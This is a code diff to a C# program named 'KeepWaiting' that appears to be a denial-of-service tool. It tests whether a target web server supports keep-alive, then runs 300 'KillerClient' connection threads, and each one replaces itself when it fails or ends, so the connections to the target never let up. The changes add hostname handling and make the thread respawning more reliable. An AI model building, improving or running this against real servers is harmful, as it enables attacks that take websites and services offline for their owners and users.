@@ -38,6 +38,7 @@ namespace KeepWaiting
         private static string sTargetHost;
         private static int iTargetPort;
         private static string sTargetPath;
+        private static bool bHostname;
 
         static void Main(string[] args)
         {
@@ -60,7 +61,9 @@ namespace KeepWaiting
             Console.Write("  Testing Vulnerability: ");
              
             IsVulnerableClient isVulnerableClient = new IsVulnerableClient(sTargetHost, iTargetPort, sTargetPath);
-            bool bIsVulnerable = isVulnerableClient.Start();
+            bool[] bVulnerable = isVulnerableClient.Start();
+            bool bIsVulnerable = bVulnerable[0];
+            bHostname = bVulnerable[1];
 
             if(bIsVulnerable == true)
             {
@@ -78,7 +81,7 @@ namespace KeepWaiting
             int x = 0;
             while (x < 300)
             {
-                KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath);
+                KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath, bHostname);
                 client.fireNewThreadNeeded += client_fireNewThreadNeeded;
                 client.Start();
                 x++;
@@ -99,7 +102,7 @@ namespace KeepWaiting
 
         static void client_fireNewThreadNeeded()
         {
-            KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath);
+            KillerClient client = new KillerClient(sTargetHost, iTargetPort, sTargetPath, bHostname);
             client.fireNewThreadNeeded+=client_fireNewThreadNeeded;
             client.Start();
         }
@@ -159,8 +162,10 @@ namespace KeepWaiting
             sTargetPath = path;
         }
 
-        public bool Start()
+        public bool[] Start()
         {
+            bool bHostname = false;
+
             Socket client = null;
 
             try
@@ -168,6 +173,7 @@ namespace KeepWaiting
                 IPHostEntry ipHostEntry = Dns.GetHostEntry(sTargetHost);
                 client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 client.Connect(((EndPoint)new IPEndPoint(ipHostEntry.AddressList[0], iTargetPort)));
+                bHostname = true;
             }
             catch
             {
@@ -179,7 +185,7 @@ namespace KeepWaiting
                 catch(Exception ex)
                 {
                     Console.WriteLine("  Invalid Address.");
-                    return false;
+                    return new bool[] { false, bHostname };
                 }
             }
 
@@ -195,18 +201,18 @@ namespace KeepWaiting
             {
                 Console.WriteLine(ex.ToString());
 
-                return false;
+                return new bool[] { false, bHostname };
             }
 
             string sHeaderResponse = GetHeaderResponse(ref client);
 
             if(sHeaderResponse.ToLower().Contains("keep-alive") == false)
             {
-                return false;
+                return new bool[] { false, bHostname };;
             }
             else
             {
-                return true;
+                return new bool[] { true, bHostname };
             }
         }
 
@@ -277,9 +283,11 @@ namespace KeepWaiting
         private string sTargetHost;
         private int iTargetPort;
         private string sTargetPath;
+        private bool bHostname;
 
-        public KillerClient(string host, int port, string path)
+        public KillerClient(string host, int port, string path, bool hostname)
         {
+            bHostname = hostname;
             sTargetHost = host;
             iTargetPort = port;
             sTargetPath = path;
@@ -294,13 +302,22 @@ namespace KeepWaiting
         private void start(object obj)
         {
             Socket client = null;
-            try
+            
+            if (bHostname == true)
             {
-                IPHostEntry ipHostEntry = Dns.GetHostEntry(sTargetHost);
-                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                client.Connect(((EndPoint)new IPEndPoint(ipHostEntry.AddressList[0], iTargetPort)));
+                try
+                {
+                    IPHostEntry ipHostEntry = Dns.GetHostEntry(sTargetHost);
+                    client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    client.Connect(((EndPoint)new IPEndPoint(ipHostEntry.AddressList[0], iTargetPort)));
+                }
+                catch
+                {
+                    fireNewThreadNeeded();
+                    thread.Abort();
+                }
             }
-            catch
+            else
             {
                 try
                 {
@@ -309,6 +326,7 @@ namespace KeepWaiting
                 }
                 catch (Exception ex)
                 {
+                    fireNewThreadNeeded();
                     thread.Abort();
                 }
             }
